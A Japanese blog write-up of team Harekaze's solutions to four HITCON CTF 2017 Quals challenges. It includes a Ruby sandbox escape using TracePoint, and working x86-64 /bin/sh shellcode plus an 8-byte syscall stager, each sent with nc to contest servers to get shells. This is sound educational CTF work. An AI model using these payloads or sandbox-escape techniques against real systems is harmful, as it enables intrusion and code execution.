---
layout: post
title: HITCON CTF 2017 Quals の write-up
categories: [ctf]
date: 2017-11-07 09:00:00 +0900
---

チーム Harekaze で [HITCON CTF 2017 Quals](https://ctf2017.hitcon.org) に参加しました。最終的にチームで 1120 点を獲得し、順位は得点 1075 チーム中 53 位でした。

以下、解いた問題の write-up です。

## [Misc 137] Data & Mining

`traffic-1b2b39e2c2231e6b98c77700da047b78.pcapng` という 200 MB ほどのサイズの pcapng ファイルが与えられました。

`strings` で `hitcon` を探してみるとフラグが得られました。

```
$ strings traffic-1b2b39e2c2231e6b98c77700da047b78.pcapng | grep hitcon
{"method":"login","params":{"login":"45duiDz79Y2AtSZH2pw9uV8YXmvtAT8tVNAYrfKTUnYiQZT5BMdRrGD4hbipmZ5DoaQXLak9ENEwYNC7kVk3ivDyMHyZCVV","pass":"hitcon{BTC_is_so_expensive_$$$$$$$}","agent":"xmr-stak-cpu/1.3.0-1.5.0"},"id":1}
```

```
hitcon{BTC_is_so_expensive_$$$$$$$}
```

## [Misc 210] Baby Ruby Escaping

以下のような Ruby で書かれたソースコードが与えられました。

```ruby
#!/usr/bin/env ruby

require 'readline'

proc {
  my_exit = Kernel.method(:exit!)
  my_puts = $stdout.method(:puts)
  ObjectSpace.each_object(Module) { |m| m.freeze if m != Readline }
  set_trace_func proc { |event, file, line, id, binding, klass|
    bad_id = /`|exec|foreach|fork|load|method_added|open|read(?!line$)|require|set_trace_func|spawn|syscall|system/
    bad_class = /(?<!True|False|Nil)Class|Module|Dir|File|ObjectSpace|Process|Thread/
    if event =~ /class/ || (event =~ /call/ && (id =~ bad_id || klass.to_s =~ bad_class))
      my_puts.call "\e[1;31m== Hacker Detected (#{$&}) ==\e[0m"
      my_exit.call
    end
  }
}.call

loop do
  line = Readline.readline('baby> ', true)
  puts '=> ' + eval(line, TOPLEVEL_BINDING).inspect
end
```

私が問題を見た時点で、[@megumish](https://twitter.com/megumish) さんが Readline によって Tab キーを押すことでフラグが含まれていそうなファイルの名前が補完されることが分かっていました。

```
$ nc 52.192.198.197 50216
baby> (Tab キーを 2 回押下)
.bash_logout
.bashrc
.profile
jail.rb
thanks_readline_for_completing_the_name_of_flag
baby>
```

早速このファイルの内容を得ようとしてみたところ、`set_trace_func` で登録されていた proc によって邪魔されてしまいました。

```
baby> File.read 'thanks_readline_for_completing_the_name_of_flag'
File.read 'thanks_readline_for_completing_the_name_of_flag'
== Hacker Detected (read) ==
```

このチェックを置き換えることはできないか調べてみると、[TracePoint](https://docs.ruby-lang.org/ja/latest/class/TracePoint.html) という `set_trace_func` のような機能を見つけました。

例外が発生すると `thanks_readline_for_completing_the_name_of_flag` の内容を `puts` するようなコードを書いてみましょう。

```ruby
TracePoint.trace(:raise) { puts File.read 'thanks_readline_for_completing_the_name_of_flag' }
```

実際に試してみましょう。

```
$ nc 52.192.198.197 50216
baby> TracePoint.trace(:raise) { puts File.read 'thanks_readline_for_completing_the_name_of_flag' }
<'thanks_readline_for_completing_the_name_of_flag' }
=> #<TracePoint:enabled>
baby> a
a
hitcon{Bl4ckb0x.br0k3n? ? puts(flag) : try_ag4in!}
hitcon{Bl4ckb0x.br0k3n? ? puts(flag) : try_ag4in!}
<main>:in `<main>': undefined local variable or method `a' for main:Object (NameError)
        from /home/jail/jail.rb:21:in `eval'
        from /home/jail/jail.rb:21:in `block in <main>'
        from /home/jail/jail.rb:19:in `loop'
        from /home/jail/jail.rb:19:in `<main>'
```

フラグが得られました。

```
hitcon{Bl4ckb0x.br0k3n? ? puts(flag) : try_ag4in!}
```

## [Misc 144] Easy to say

`easy_to_say-c7dd6cdf484305f7aaac4fa821796871` というファイルが与えられました。`file` に投げてどのようなファイルか確認しましょう。

```
$ file ./easy_to_say-c7dd6cdf484305f7aaac4fa821796871
easy_to_say-c7dd6cdf484305f7aaac4fa821796871: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ebaecbb5f55329380b6476b55253b4ea59d91891, stripped
```

x86_64 の ELF のようです。実行してみましょう。

```
$ ./easy_to_say-c7dd6cdf484305f7aaac4fa821796871 
Give me your code :a
Run !
Illegal instruction
```

`objdump` で何をやっているか読んでみると、24 バイトまで読み込み -> 2 回以上出現するバイトがないかチェック -> `rsp` 以外のレジスタを 0 に初期化 -> 入力された命令列を実行という処理を行っていることが分かりました。

[Linux/x86-64 - Execute /bin/sh - 27 bytes](http://shell-storm.org/shellcode/files/shellcode-806.php) を元に、必要ない命令を削ったり重複するバイトが出現しないようにいじると以下のようなシェルコードができました。

```
bits 64
start:
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    xor al, 0x3b
    syscall
```

ですが、このままだと `mov rbx, 0xFF978CD091969DD1` と `neg rbx` で REX プリフィックスの部分が被ってしまいます。`neg rbx` の方を `48` (`rex.W`) から `4a` (`rex.WX`) に変えてしまいましょう。

```
$ (echo -en "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x4a\xf7\xdb\x53\x54\x5f\x34\x3b\x0f\x05"; cat) | nc 52.69.40.204 8361
Give me your code :Run !
ls /home/
easy_to_say
ls /home/easy_to_say/
easy_to_say
flag
run.sh
cat /home/easy_to_say/flag
hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}
```

フラグが得られました。

```
hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}
```

## [Misc 255] Re: Easy to say

`re_easy_to_say-4d171ed2949ad2e9fcb5350c71aa80ec` という x86_64 の ELF ファイルが与えられました。内容はほとんど [Misc 144] Easy to say で与えられたものと同じですが、シェルコードは 8 バイト以内でなければならないという制限が加えられています。

`execve` で `/bin/sh` を実行する前に、stager を挟んで 9 バイト以上の命令列を読み込んで実行できるようにする必要がありそうです。

`rax` が 0 に初期化されているので、このまま `syscall` を呼ぶことで `read` ができます。第 2 段階のシェルコードの読み込み先として `rip` を手に入れる必要がありますが、`call a; a: pop rax` や `lea rax, [rip]` のような方法はシェルコード全体で 8 バイト以内という制限上厳しそうです。

なんとかできないか調べると、[Intel® 64 and IA-32 architectures software developer's manual](https://software.intel.com/sites/default/files/managed/7c/f1/253667-sdm-vol-2b.pdf#page=666) に以下のような説明がありました。

> SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR
> MSR (after saving the address of the instruction following SYSCALL into RCX). (The WRMSR instruction ensures
> that the IA32_LSTAR MSR always contain a canonical address.)

`syscall` を呼ぶ -> 第二引数に `rcx` を格納 -> `read` でシェルコードを書き込むという手順で `/bin/sh` の実行ができそうです。

```
$ asm -c amd64 "a: syscall; push rcx; pop rsi; mov dl, 0x7f; jmp a"
0f05515eb27febf8
$ (echo -en "\x0f\x05\x51\x5e\xb2\x7f\xeb\xf8"; echo -en "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"; cat) | nc 13.112.180.65 8361
ls /home/
re_easy_to_say
ls /home/re_easy_to_say/
flag
re_easy_to_say
run.sh
cat /home/re_easy_to_say/flag
hitcon{sYsc4ll_is_m4g1c_in_sh31lc0d3}
```

フラグが得られました。

```
hitcon{sYsc4ll_is_m4g1c_in_sh31lc0d3}
```